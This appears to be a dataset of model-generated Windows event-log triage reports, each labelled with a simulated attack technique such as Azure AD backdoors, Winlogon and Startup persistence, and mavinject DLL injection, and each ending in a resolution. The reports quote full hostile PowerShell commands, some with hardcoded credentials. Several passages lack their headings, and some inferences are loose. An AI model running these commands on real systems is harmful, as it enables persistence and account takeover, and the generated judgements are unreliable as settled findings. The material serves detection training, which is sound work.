  - There are multiple instances of `wevtutil.exe` being executed by the user `admin_test`, a utility known for managing event logs. While `wevtutil.exe` is commonly used for legitimate purposes, frequent invocation could indicate attempts to tamper with or clear the logs to cover tracks of malicious activity.

#### Security Log Analysis
- **User Enumeration and Privilege Audit Logs**:
  - There are events (ID 4798) showing queries for multiple accounts (`Administrator`, `admin_test`, `DefaultAccount`, etc.) indicating some sort of account enumeration activity.
  - Events such as these often don't directly indicate malicious behavior but can precede or accompany malicious actions like brute force attempts or privilege escalation.

#### Application and System Log Analysis
- **Windows Updates and Defender Activity**:
  - Logs indicate that `Windows Defender` is active (`SECURITY_PRODUCT_STATE_ON`), which generally is a positive indication of some level of protection.
  - Multiple successful updates for Windows Defender indicating updates are current, suggesting that at least some aspects of system hygiene are maintained.

- **Time Discrepancy Noted in System and Security Logs**:
  - Minor discrepancies in time noted in kernel logs (ID 4616 in Security, and ID 24, 1 in the System log) related to time adjustments could suggest manual time changing which is suspicious in certain advanced threat tactics. However, without further context, this alone doesn’t confirm malicious activity.

#### Final Assessment
The detected behavior of PowerShell usage to modify security-related registry keys and multiple instances of essential Windows utilities being run in a short time frame are indeed concerning. However, without additional context or suspicious elements (e.g., external connections, file modifications, etc.), a definitive conclusion cannot be drawn from this activity alone.

**Resolution**: **SUSPICIOUS** - The logs contain activity that doesn't look right and requires more investigation.
  
### Recommendations
1. **Conduct a Threat Hunt**: Investigate the `admin_test` user account activities further. Validate what tasks are typically under their charge and verify any authorized use of PowerShell scripts and `wevtutil.exe` commands.
2. **Review Registry Changes**: Confirm if the registry changes align with expected configurations set internally, especially those concerning security policies.
3. **Monitor Network Traffic**: Ensure no unusual outbound traffic or suspicious connections from the host.
4. **System Integrity Check**: Run comprehensive scans to ensure no malicious binaries are present. Also, check the integrity and settings of crucial security components.
5. **Log Retention and Alerting**: Adjust logging configurations to retain a longer history of PowerShell activity, and establish alerts for such registry changes in the future.

By addressing these key actions, potential threats might be mitigated, and further clarity on the nature of these actions can be attained."
Azure AD Application Hijacking - App Registration,"Upon analyzing the given logs from the Windows machine, several events indicate potentially malicious activity, with particular focus on the execution of suspicious PowerShell commands often used in escalating privileges and establishing backdoors. Here’s a detailed breakdown:

1. **Sysmon Logs:**
   - Multiple instances of processes such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe` being executed by the `SERVER002\admin_test` user. The bold indicator here involves PowerShell (`powershell.exe`), particularly in conjunction with suspicious command-line parameters.
   - The process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` runs with potentially harmful commands, emphasizing actions like creating self-signed certificates and leveraging Azure AD modules for potential unauthorized access.

2. **PowerShell Logs:**
   - The logs reveal a potentially malicious PowerShell script's execution that uses Azure AD modules to connect to Azure AD with credentials, generate a self-signed certificate, and manipulate Azure AD application credentials. This sequence could denote attempts at persistence or unauthorized access.
   - The script aims to add credentials to an Azure AD application, indicating a method to maintain access or manipulate configuration within an Azure environment, a common tactic used in advanced persistent threats (APTs).

3. **Security Logs:**
   - Privileged actions and credential access attempts without successful returns are logged, with multiple failed credential return attempts.
   - Event ID 4672 shows privileged access levels like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., assigned to processes, which could be used for privilege escalation.

4. **Indicators of Malicious Activity:**
   - The use of `New-SelfSignedCertificate` in PowerShell signifies the creation of a certificate for potentially illegitimate use.
   - Commands executed as part of the PowerShell script suggest an exercise in gaining or maintaining unauthorized access to Azure AD through a backdoor or through credentials associated with a cert.

**Assessment:**
The events indicate a coordinated effort to interact with Azure AD using potentially malicious intentions. The attempt to manipulate Azure credentials and applications, combined with the creation and use of self-signed certificates, aligns with activities often seen in sophisticated cyber intrusions aimed at privilege escalation and persistence in cloud services.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine from the network to prevent any potential further spread or data exfiltration.
- Conduct a full forensic analysis to determine the scope and impact of the breach, including any potential data accessed or exfiltrated.

Add Federation to Azure AD,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:
- There are multiple executions of system utility tools such as `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and more, executed under the context of the user `SERVER002\\admin_test`.
- A specific PowerShell command with a suspicious command line has been executed:
  ```
  ""powershell.exe"" & {Import-Module AzureAD, Import-Module AADInternals, $PWord = ConvertTo-SecureString -String \""iamthebatman\"" -AsPlainText -Force, $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""bruce.wayne@contosocloud.com\"", $Pword, ...}
  ```
  This PowerShell script is attempting to configure a federation setup with Azure AD using what appears to be unauthorized credentials (`bruce.wayne@contosocloud.com`). The script includes references to the `AADInternals` module, which is often used for advanced Active Directory operations, potentially including offensive security measures or exploitation of AD-related vulnerabilities.

### Malicious Activity Indicators:
- **Commands:** The usage of `ConvertTo-AADIntBackdoor` within the PowerShell command line indicates an intention to create a backdoor within Azure AD, which is a strong indicator of a compromise or an attempted compromise.
- **PowerShell Use:** Elevated integrity level and execution of PowerShell with modules that can modify or interact with Azure AD, particularly when attempting actions like setting up federation or backdoors, raise immediate red flags.
- **Unusual User Behavior:** The actions being executed appear to attempt administrative changes or system investigations (e.g., running wevtutil, whoami) which may not align with normal operations, raising further suspicion.

### Assessment:
The combination of frequent executions of administrative commands and tools, coupled with the PowerShell script aimed at altering Azure AD federation settings, strongly suggests an intent to gain unauthorized access or maintain persistence within the system. These actions are neither typical for routine administrative tasks nor benign user behavior. They coincide with tactics often observed in privilege escalation and post-exploitation activities.

### Conclusion:
Based on the evidence in these logs, the activities logged point to unauthorized and potentially harmful intent. The use of PowerShell script to interact with Azure AD using suspicious and possibly hasty credentials configuration gives a strong signal of malicious intent.

    - **Suspicion**: PowerShell is being used to execute a file located in a temporary directory. This is unusual behavior as scripts run from temporary directories often indicate suspicious activity. The lack of further PowerShell commands or script name adds to this suspicion.

### Sysmon Log:
1. **Processes Executed**:
    - **whoami.exe** and **conhost.exe** were executed. These command-line utilities themselves are not inherently malicious but can be used as part of reconnaissance activities.
    - **wevtutil.exe**: This utility is used for managing event logs and, if used improperly, can indicate log tampering or data exfiltration attempts, especially given its multiple occurrences.
    - **PowerShell executed a similar command** as seen in the PowerShell logs, confirming potential malicious intentions behind running binaries, potentially indicating execution through script-based attack vectors.

### Application Log:
No suspicious or unusual entries were found in this log.

### Security Log:
1. **Privilege Escalation Events**:
    - **Events 4672 Multiple Occurrences**: Indicates special privileges assigned to new logons, which can imply potential privilege escalation, especially with privileges like `SeDebugPrivilege` and `SeLoadDriverPrivilege`.

### Assessment:
- The execution of a binary from a temporary directory via PowerShell (`EtwpCreateEtwThread.exe -debug`) alongside assigning sensitive privileges (Event ID 4672) suggests potentially malicious activities like unauthorized access or privilege escalation.
- There are several log events associated with utilities commonly leveraged for reconnaissance (`whoami.exe`) and potential log tampering or event log management (`wevtutil.exe`).
  
### Conclusion:
The activities observed in the logs, particularly the execution of suspicious PowerShell commands from a temporary directory, use of binaries without clear business justification, and unusual privilege assignments, warrant further investigation. 

**Resolution**: **SUSPICIOUS**

Domain Password Policy Check: No Uppercase Character in Password,"Based on the analysis of the provided Windows event logs, several indicators suggest potential malicious activity or at least behavior that necessitates further investigation.

1. **PowerShell Activity**:
   - The logs consistently show execution of a PowerShell script that interacts with user credentials. The script checks for a credential file, compares passwords, changes the Active Directory (AD) account password, and updates the credential file on the local system. This is done using `powershell.exe`.
   - The script includes logic to identify if the current password matches a pre-defined string (""lower-long-special-333"") and performs actions based on the result. This behavior is indicative of password manipulation attempts and could be part of an attack aimed at credential theft or propagation.

2. **Security Log Observations**:
   - Numerous `4798` and `4799` security events are logged. These events are related to enumeration of a local account's membership on the system, initiated by `CompatTelRunner.exe`. While `CompatTelRunner.exe` (Microsoft Compatibility Telemetry) is a legitimate executable, its involvement in these actions alongside suspect PowerShell commands raises red flags, especially if it is being abused for privilege enumeration.
   - Event ID `4624` highlights a successful logon for `SYSTEM` using the `Advapi` process, associated with a batch or service logon type. This could be routine, but it warrants analysis in the broader context of suspicious PowerShell activity.

3. **Sysmon Logs**:
   - Several Sysmon logs indicate the execution of processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`) under the user `admin_test`, often in a highly elevated integrity context. This could suggest reconnaissance or attempts to gather information about user roles or system configuration.
   - The frequent execution of `wevtutil.exe`, which is used to modify and read event logs, might suggest that an attacker is trying to cover tracks by deleting or modifying event logs.

**Assessment**:
- The combination of persistent password manipulations, potential credential dumping, suspicious use of system utilities, and the Sysmon logs pointing to elevated privileges all contribute to the indication that this is not benign activity.
- While some executables and scripts might be legitimate, their current usage pattern in these logs suggests possible misuse.

**Resolution**:
- **SUSPICIOUS**: This activity is suspicious and merits further in-depth investigation. Immediate steps should involve isolating the machine for further forensic analysis, reviewing any recent changes in user account activities, especially for the user `admin_test`, and conducting log retention to ensure any future investigations aren't hindered by potential log tampering.

**Guidance**:
- Conduct a full review of user accounts and ensure robust logging from entry points (including RDP, VPN access logs).
- Update endpoint protection to incorporate advanced threat detection.
- Review network traffic logs for any anomalous data exfiltration signs.
- Check for any suspicious entries in `Task Scheduler` or services as potential persistence mechanisms.

Given the severity of potential risks to the organization's security posture, it's advisable to engage your incident response team to mitigate any unauthorized access promptly."

### Sysmon Log:
- The Sysmon logs detail various processes involved with edge updates and some standard command executions like ""wevtutil,"" ""conhost,"" ""hostname,"" ""whoami,"" and ""cmd."" 
- The use of `cmd.exe` to execute `secedit` commands with specific configurations is notable. However, `secedit` is a legitimate tool used to configure security policies. The command executed (`secedit /import` and `secedit /configure`) appears to be altering system security settings, which, under usual circumstances, is part of legitimate system administration.

### Detailed Observations:
- Multiple instances of processes related to Microsoft Edge updates (e.g., MicrosoftEdgeUpdate.exe, MicrosoftEdgeUpdateSetup_X86, etc.) are seen. These processes are typically invoked for browser updates and do not inherently indicate malicious behavior.
- There are no anomalous command-line arguments or indicators of suspicious scripts or unauthorized privilege escalations.

### Conclusion:
- **Resolution: BENIGN**

The logs contain activity typical of a Windows environment. The presence of system services, such as edge updates, and the execution of typical administrative tasks, like configuring security policy with `secedit`, are expected operations within such an environment.

**Guidance:**
- Despite the assessment of this activity as benign, it is always crucial to ensure that only authorized personnel have appropriate access to manage system configurations. Continuous monitoring and regular audits can help maintain system integrity and promptly identify any future anomalous behavior."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"After analyzing the provided Windows event logs, the following observations and findings are noted:

1. **Regular Microsoft Edge Update Activity**:
   - Multiple events are related to the execution of `MicrosoftEdgeUpdate.exe` and its associated processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe`, which appear to reflect typical software updates for Microsoft Edge. These actions are typical for automated update activities and are consistent with system update operations executed under `NT AUTHORITY\SYSTEM`, which is standard for legitimate update processes.

2. **Execution of PowerShell with Suspicious Command**:
   - An instance of PowerShell (`EventID: 17995`) executed a command involving `Set-ItemProperty` targeting the registry path `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}` with `StubPath` set to `C:\Windows\System32\calc.exe`. This operation then triggers `runonce.exe`. This could indicate an attempt to persistently load an executable (Calculator in this case) when certain operations occur, often a technique used in maintaining execution on system restart or user logins.

3. **Execution of `runonce.exe` and `calc.exe`**:
   - The `runonce.exe` process is called by the aforementioned PowerShell command, followed by the execution of `calc.exe`. While `calc.exe` itself is not harmful, the mechanism through which it is executed suggests an attempt to test or set up some persistence mechanism, as it is being handled via `runonce.exe`.

4. **Multiple Invocations of Utility Applications**:
   - Instances of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are seen executed multiple times. Although commonly used utilities, frequent execution in a short period (especially when associated with scripts) can indicate reconnaissance or configuration activities.
   
5. **Time Change Events**:
   - The security logs show events related to time changes (`EventID: 4616`), which are both reset to a very similar point within a second. This might simply reflect time synchronization activities, but it can also sometimes be associated with attempts to cover tracks by altering log timestamps.

### Conclusion:

- **SUSPICIOUS**: The presence of a PowerShell script modifying registry settings to set a persistent execution path for `calc.exe`, alongside executions of `runonce.exe`, suggests activity that is not typical for regular use. While `calc.exe` is benign, the method of its execution along with registry changes can signify potential testing or setup of persistence typically seen in malicious operations.

### Recommendations:

1. **Investigation**: Conduct further investigation into the origin of the PowerShell script that modified the registry. Review whether this activity aligns with any known schedule tasks or approved changes within the organization.
   
2. **Endpoint Review**: Check the system for unauthorized scheduled tasks or startup entries that might have been modified.
   
3. **User Activity**: Verify if the activity corresponds with legitimate user actions or a sanctioned update process. Ensure endpoint compliance with security policies regarding the use of PowerShell for administrative tasks.

4. **Threat Intelligence Check**: Cross-reference the activities and commands with threat intelligence databases to see if similar patterns match known attack vectors or threat actors."
Process Injection with Go using CreateThread WinAPI (Natively),"Here is an analysis of the provided Windows event logs:

### **Analysis:**

1. **Security Log:**
   - The main event seen here is Event ID 4616, which indicates a change in system time. The process responsible for this change is the `svchost.exe` running under the `LOCAL SERVICE` account. Multiple rapid events adjusting the time backward are recorded. This is a method sometimes used by attackers to cover their tracks by altering event timestamps.

2. **Sysmon Log:**
   - Event ID 5 logs pertain to the creation of processes, notably `wevtutil.exe` and `conhost.exe` processes repeatedly initiated by the `admin_test` user.
   - `wevtutil.exe` is a legitimate application used to manage and query event logs, and its repetitive use without obvious justification can be suspicious if not in the context of routine administrative tasks.
   - `Event ID 1` for `powershell.exe` demonstrates a command execution involving a path in a temporary folder referring to `CreateThreadNative.exe`. The usage of PowerShell with such command-line arguments running from a temporary directory is often indicative of potentially malicious activity.
   - `whoami.exe` and `conhost.exe` executions appear benign in isolation but could be suspicious given the context of the surrounding events.
   - The `hostname.exe` and usage of `whoami.exe` could be benign tools for determining system info, but in conjunction with the PowerShell command, they may be components of reconnaissance activities conducted by an attacker.

3. **Windows PowerShell Log:**
   - The PowerShell log entries indicate the execution of a suspicious PowerShell command: `powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThreadNative.exe -debug}`. Use of temporary file execution in PowerShell is often linked to malicious behavior, including execution of a potentially unauthorized or malicious binary.

4. **System Log:**
   - Multiple instances of time change operations are recorded (`Event ID 1` by `svchost.exe`), aligning with the security log. This could be indicative of someone attempting to tamper with the timing of logging events.

5. **Application Log:**
   - Contains a benign entry related to the Software Protection Platform Service.

### **Assessment and Conclusion:**

- **Indicators of Malicious Activity:**
  - The frequent and unexplained usage of `wevtutil.exe` combined with repetitive PowerShell commands utilizing a temporary file, suggests unauthorized activity or a potential breach.
  - The backward alteration of system time to potentially cover tracks.
  - The execution of PowerShell with the specific command `{C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThreadNative.exe -debug}` is suspicious and could indicate malicious activity as it indicates possible execution of an unverified/unauthorized executable.

### **Resolution:**
- **Resolution: MALICIOUS**

Given the presence of suspicious and potentially malicious PowerShell activity, repetitive unusual process executions (`wevtutil.exe`), and time manipulation consistent with attempts to cover tracks, these logs strongly suggest malicious activity.

### **Guidance:**
- Immediately conduct a deeper investigation into the activities of the `admin_test` account.
- Isolate the machine (Server002) for further forensic analysis.
- Examine the `CreateThreadNative.exe` and other files in the related temporary directories for malicious code.
- Review console host usage logs and correlate any other accounts displaying similar behavior.
- Consider a system and software integrity check, especially focusing on PowerShell and associated scripts.
- Implement enhanced monitoring and audit logging to catch similar activity in the future, ensuring synchronized and protected time settings."
Add Executable Shortcut Link to User Startup Folder,"### Detailed Analysis of Logs

#### Application Log
- **EdgeUpdate Service Stopped**: The logs indicate that the EdgeUpdate service stopped at two different times (15:33:28 and 15:33:35). This typically indicates a normal software update or restart of the service.
- **Windows Defender**: The log at 15:33:35 indicates Windows Defender was active (`SECURITY_PRODUCT_STATE_ON`). This is a healthy sign showing real-time protection was enabled.

#### Windows PowerShell Log
- **PowerShell Activity**: The logs capture a PowerShell session where a script creates a shortcut to launch `calc.exe` from the Startup folder. This is suspicious as it aims to ensure `calc.exe` runs every time the system starts. This behavior is often associated with persistence mechanisms used by malware to re-establish itself after a system restart.

#### Sysmon Log
- **Process Creation**:
  - **whoami.exe & hostname.exe**: Logging calls to system utilities `whoami` and `hostname`, both of which display system and session information, but don't necessarily indicate malicious activity on their own.
  - **PowerShell Execution**: A PowerShell instance executing a script matching precisely with the actions seen in the PowerShell log (creating a shortcut for `calc.exe` in the Startup location).
  - **Edge Update Processes**: Multiple Edge Update processes indicate an update being applied, which matches with their stopping behavior seen in the Application log. These entries do not show any initial indication of malicious activity.

#### System Log
- **Windows Update**: Two security intelligence updates for Microsoft Defender Antivirus at different times (15:33:33 and 15:33:34) indicate the system was updating its threat intelligence, which is standard behavior.

### Assessment
The logs predominantly show routine system processes and application updates. However, the PowerShell script in both the PowerShell and Sysmon logs that creates a startup entry for `calc.exe` is an anomaly. Creating such a persistence mechanism without user intent can be an indicator of potential malicious activity.

### Resolution
- **SUSPICIOUS**: The activity involving the PowerShell script to create a startup entry for `calc.exe` requires further investigation. While other processes and updates seem benign and align with typical system behavior, this action could indicate an unauthorized persistence attempt.

### Recommendations
1. **Immediate Actions**:
   - Verify the intent and authorization of the PowerShell script execution.
   - Check for other changes to Startup configurations and scheduled tasks.
   - Review access logs and alert on similar PowerShell activity.
2. **Further Investigation**:
   - Interview any personnel responsible for maintenance scripts to confirm if the script is a sanctioned activity.
   - Run an additional virus and malware scan with updated definitions.
3. **Preventive Measures**:
   - Tighten controls on PowerShell executions via Group Policies or Application Whitelisting.
   - Monitor the Startup folder and set alerts for any unauthorized changes."
Winlogon HKLM Userinit Key Persistence - PowerShell,"Upon reviewing the provided logs, several events stand out that indicate potentially suspicious or malicious activity:

1. **PowerShell Activity**:
   - The execution of a PowerShell command altering the registry key `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` to include `cmd.exe` is highly unusual and indicative of malicious behavior. This registry change is often associated with persistence mechanisms used by attackers to maintain access to a system. The command line for this operation is captured as:
     ```
     powershell.exe & {Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force}
     ```

2. **Privilege Escalation / Privilege Use**:
   - The user `admin_test` is associated with high integrity and possesses several high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), which could be leveraged for malicious purposes. However, the mere presence of these privileges does not in itself indicate an attack, but in combination with other activities can be a red flag.

3. **Anomalous Process Executions**:
   - There are numerous instances of processes like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` running under the `admin_test` user. While these might be legitimate uses, their frequency and the context of their execution surrounding the PowerShell registry alteration demand further investigation.

4. **Edge Update Events**:
   - Frequent execution of `MicrosoftEdgeUpdate.exe` and related processes appears to be standard update activity. However, they do not directly relate to the suspicious PowerShell activity. These events look normal for a system handling browser updates.

5. **Time Change Event**:
   - There is a recorded time change in the logs, but the reason given (""Normal course correction"") does not imply malicious intent. Nevertheless, such changes can often accompany suspicious activities, making it worth noting in the context of other suspicious events.

**Assessment and Resolution:**

The presence of a PowerShell command altering critical registry settings for potential persistence, coupled with the related process executions, strongly suggests malicious intent or compromise.

Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
- Conduct a complete forensic investigation to determine the full extent of the compromise.
- Isolate the machine (Server002) from the network to prevent further potential breaches.
- Examine network logs and connections from this machine to identify any lateral movement.
- Review user account activities, especially for `admin_test`, to detect unauthorized access patterns.
- Restore the affected registry settings and consider a full system reimage to remove residual threats.
- Implement monitoring measures to detect similar behavior in the future and educate users on potential security risks."
Process Injection via Extra Window Memory (EWM) x64 executable,"Based on the provided log entries from the Windows host system, let's analyze the events across different logs to detect any indications of malicious activity.

### Application Log
- The Software Protection Platform Service log entries with events 16384 and 16394 are typical and generally pertain to valid operations related to software licensing validation and management. These events alone do not suggest malicious activity.

### Security Log
- Event ID 4624 (Logon) with LogonType 5 indicates a service logon, which is typical for system operations and maintenance tasks. The account used is ""SYSTEM,"" which is the highest privilege account for internal system operations.
- Event ID 4672 indicates special privileges being assigned to the SYSTEM account, which is standard during system logon.
- Event ID 5379 indicates credential manager related events with return codes that do not suggest successful credentials retrievals, which might be attempts or atypical access attempts. However, these return codes are common in certain operational contexts and don't exclusively indicate a compromised activity.

### Sysmon Log
- Several legitimate processes are executed, such as `wevtutil.exe`, `conhost.exe`, `MicrosoftEdgeUpdate.exe`, `taskhostw.exe`, etc. The activities related to these processes do not deviate from expected system behavior.
- Key highlight here is the execution of `powershell.exe` with a command to run a binary from `AppData\\Local\\Temp\\file\\data.011\\bin\\data.011_x64.exe`. This is highly suspicious because execution of binaries from temporary directories via PowerShell is a common tactic used by malware for persistence or lateral movements.
  
### Windows PowerShell Log
- Several logs are showing the start of PowerShell providers followed by execution of a command with `powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\bin\\data.011_x64.exe}`. This activity further indicates potential suspicious activity because arbitrary binary execution via PowerShell using scripts hosted in temp directories is often linked to hostile activities.

### Summary and Resolution
The logs exhibit signs of potential malicious activities:

1. **Execution of a potentially suspicious binary**: The use of PowerShell to execute a binary located in a temporary directory is typical of potentially malicious behavior such as malware execution.
2. **Use of the SYSTEM account**: While activity under the SYSTEM account isn't inherently malicious, in conjunction with previous signs, it raises further concern.

Given these observations, further investigation into `data.011_x64.exe` and its origin is recommended, as it is indicative of suspicious behavior. 

The resolution for these log entries is:
- **SUSPICIOUS**: The logs contain activities such as PowerShell executing binaries from a temp directory, which doesn't seem right and requires more investigation to conclude if it's indeed malicious."
Print Processors,"### Analysis

Upon examining the logs provided, there are several key indicators of potentially malicious behavior:

1. **PowerShell Script Execution**: There is a PowerShell command that changes the startup type of the spooler service, stops it, copies a DLL (fileTest.dll) to a printer processor directory, modifies the registry to add this DLL as a driver, and then restarts the spooler. This sequence of actions is highly suspicious and often indicative of a technique known as ""DLL Hijacking,"" where malicious DLLs are loaded by legitimate services.

2. **Usage of `wevtutil.exe`**: This utility is used to manage event logs. Multiple instances of this being run could indicate an attempt to clear logs after some activity.

3. **Privilege Escalation and Service Modifications**: The PowerShell script and related activities run under a user account with high integrity level, potentially allowing changes to critical system settings, such as service configurations and registry modifications.

4. **Security Event - Privilege Assignment**: Event ID 4672 showing privileges like `SeDebugPrivilege` indicates an account with administrative privileges is being used, which is another red flag especially when combined with other suspicious activities.

5. **Alteration of Print Spooler Settings**: Stopping and starting the print spooler and changing the registry might be a method to ensure a malicious DLL is loaded by the system, suggesting possible persistence mechanisms or privilege escalation methods.

6. **Temporary and Edge Update Directories Activities**: Several entries show process creation and command executions from paths related to temporary folders and Edge updates. While these activities don't inherently indicate malware, they could be used for downloading or executing malicious code through legitimate processes.

### Assessment

Based on the analysis above, the logs indicate a strong possibility of malicious activity. The combination of the PowerShell script modifying the spooler service, system-level privileges being utilized, and file modification to include DLLs in service processes points to a compromise exploiting DLL hijacking techniques or some form of persistence mechanism.

### Resolution

- **MALICIOUS**: The log entries contain a sequence of operations that are characteristic of malicious activities, particularly a DLL injection through service manipulation (spooling service), combined with high privilege operations.

### Guidance

1. **Immediate Isolation**: Isolate the affected host from the network to prevent further potential spread or data exfiltration.
   
2. **Thorough Investigation**: Conduct a comprehensive forensic analysis of the system to determine how the compromise occurred, examining additional logs, network traffic, and file changes during the timeframe of the detected activities.

3. **Patch and Update**: Ensure the system is updated with the latest security patches, particularly any known vulnerabilities related to the Windows spooler service (notably CVE-2021-34527).

4. **Malware Scanning and Removal**: Use anti-malware software to scan and remove any detected threats, focusing on the directories and files mentioned in the logs.

5. **Review Access and Permissions**: Assess and adjust privilege levels for users on the system to prevent unauthorized high-level script execution and service modifications.

6. **Logging and Monitoring**: Enhance logging, monitoring, and alert systems to catch similar activities in real-time across the network infrastructure.

Following these steps can help mitigate immediate risks and prevent similar incidents in the future."
Process Injection via mavinject.exe,"## Detailed Analysis

Based on the provided Sysmon, System, Application, and PowerShell logs, the following analysis aims to determine whether there is any indication of malicious activity within the logs:

### 1. Sysmon Log Analysis
- **PowerShell Execution**: There are multiple entries indicating that `powershell.exe` was executed by the user `SERVER002\\admin_test`. Particularly notable is the command: 
  ```
  powershell.exe & {$mypid = (Start-Process notepad -PassThru).id, mavinject $mypid /INJECTRUNNING \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\x64\\data.001.dll\"", Stop-Process -processname notepad}
  ```
  This command attempts to inject a DLL into a running process which is a known technique for process hollowing or running malicious code and is often indicative of malware behavior.

- **Wevtutil Usage**: Multiple instances of `wevtutil.exe` were recorded. This tool is typically used to manage event logs; however, its use alongside suspicious activity might denote an attempt to clear or export event logs to cover tracks.

### 2. Application Log
- **Software Protection Platform Service**: There is an event for the protection service starting, which is normal system behavior and does not raise immediate concern.

### 3. PowerShell Log
- **Host Application**: Confirmed that the suspicious PowerShell script that uses `powershell.exe` for malicious activity corresponds with the behavior seen in the Sysmon logs.

### 4. Additional Observations
- **Console Host (Conhost.exe) and Notepad Executions**: There are numerous instances of `conhost.exe` and `notepad.exe`, both commonly used in conjunction with PowerShell commands like the one mentioned above to hide malicious activity.
  
- **High Integrity Level**: Several processes are marked with `High` integrity levels, executed by the user `SERVER002\\admin_test`, indicating administrative privileges, which could further empower malicious actions.

## Conclusion

Given the evidence collected from the Sysmon logs, particularly the PowerShell command that involves DLL injection (`mavinject`), and the utilization of system utilities like `wevtutil.exe` for possible anti-forensic activities, there is substantial indication that the activity recorded in these logs is indeed **malicious**.

## Resolution
- **Resolution**: MALICIOUS

### Guidance on How to Proceed
1. **Containment**: Immediately isolate the host from the network to prevent further potential spread or data exfiltration.
2. **Investigation**: Conduct a deeper forensic analysis on the isolated system, focusing on the injected DLL and any additional files or scripts in the temporary directories.
3. **Eradication and Recovery**: Remove the malicious payloads and consider re-imaging the system. Ensure all patches and security measures are updated.
4. **Preventative Measures**: Implement enhanced logging, monitoring, and user education to detect and prevent similar attempts in the future. Adjust IAM policies to restrict PowerShell execution and limit administrative access.

This analysis indicates a severe security incident involving possible unauthorized access and code execution, necessitating immediate and comprehensive incident response actions."
Azure AD - Add Company Administrator Role to a user,"The provided logs reveal multiple activities that deviate from typical patterns, hinting at potentially malicious behavior. Here's a detailed analysis:

### Suspicious or Anomalous Behavior Detected:

1. **PowerShell Activity:**
   - **PowerShell Log Entries:**
     - The entries show a PowerShell command attempting to import the `MSOnline` module, followed by actions that hint at privilege escalation. Specifically, it creates a new `PSCredential` object using hardcoded credentials (`jonh@contoso.com`) and attempts to add a user to the ""Company Administrator"" role. This operation through PowerShell often points to an unauthorized attempt to elevate privileges or manipulate admin roles.
   - **Suspicious Use of Hardcoded Credentials:**
     - The presence of `$Password = ConvertTo-SecureString -String ""p4sswd"" -AsPlainText -Force` suggests weak security practices or an intrusion attempt that leverages default or known passwords.

2. **Sysmon Events:**
   - Multiple instances of `powershell.exe` and other associated processes (`wevtutil.exe`, `conhost.exe`) executed by the user `SERVER002\\admin_test` under a high integrity level. This suggests the user has elevated privileges.
   - The execution of `wevtutil.exe` several times could suggest attempts to manage or delete event logs, a common step in obfuscating malicious activities.

3. **Command Line Analysis:**
   - PowerShell command line inputs include script blocks that appear automated, which might be indicative of scripts running to achieve a specific task programmatically.

4. **Possible Privilege Escalation:**
   - The attempt to change role membership within MSOnline services and the execution context might constitute a privilege escalation, particularly with the role of ""Company Administrator"".

5. **System and Application Logs:**
   - While these show routine updates and processes consistent with Windows operations, the noticeable aspect is their execution close in timing to the suspicious PowerShell activities.

### Assessment:

The activities observed in the PowerShell logs, particularly the privilege escalation attempt using hardcoded credentials and role modification command, paired with Sysmon entries indicating high-integrity processes executed by `admin_test`, strongly indicate compromised host activity.

### Threats and Risks Identified:

These activities could lead to unauthorized access to sensitive data, privilege escalation, or the potential launching of other undetected malicious operations. The pattern of events certainly suggests either a targeted attack or misuse by someone with direct access.

### Guidance on How to Proceed:

- **Immediate Isolation:** The affected machine should be isolated from the network to prevent further potential damage or lateral movement.
- **Password Changes:** Immediate change of all credentials potentially exposed, especially those used by `jonh@contoso.com`.
- **Role and Privilege Review:** Assess current user roles and privileges within the organization, ensuring they align correctly with their actual needs.
- **Log Review:** Further examination of the logs to identify any other anomalous behavior.
- **System Forensics:** Conduct a detailed forensic analysis on the host to gain complete context of any unauthorized changes or additional backdoors set.
- **Patch Systems:** Ensure that all systems, especially those involved, are fully updated with the latest security patches.

### Conclusion:

Based on the analysis, the activities branded indicate a strong likelihood of a malicious operation affecting the host. Therefore, the resolution is tagged as **MALICIOUS**. Immediate mitigation actions are essential to contain and investigate the threat."
Persistence by modifying Windows Terminal profile,"Upon analyzing the provided Windows event logs, here are the key observations and findings:

### Suspicious or Anomalous Behavior:
1. **Frequent Use of `wevtutil.exe`:**
   - `wevtutil.exe` is executed multiple times in quick succession. This utility is used for managing Windows Events, including exporting and clearing event logs. Excessive use in this manner, especially by a user account, might indicate attempts to tamper with the logs or conduct forensic evasion.

2. **PowerShell Activity with External Network Requests:**
   - There are instances of `powershell.exe` making use of `Invoke-WebRequest` to download a file from an external URL (`https://github.com/.../settings.json`). While downloading files via PowerShell is not inherently malicious, it can be a potential indicator of compromise if not part of a legitimate administrative task, especially if it was run by a less privileged or monitored user account.

3. **Execution of Administrative Tools:**
   - The logs show execution of `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `conhost.exe`. While these are legitimate Windows binaries, their simultaneous or abnormal execution, combined with the previous anomalies, might be suspicious.

### Evaluation of Malicious Indicators:
- **Powershell with External Network Activity:**
  The PowerShell script uses a network resource to fetch a configuration file and overwrite a local copy. Such behavior is commonly seen in advanced persistent threat (APT) actors or malware employing living-off-the-land binaries (LOLBins) tactics to download and execute malicious code under the guise of legitimate operations. 

- **Log Exporting Using `wevtutil.exe`:**
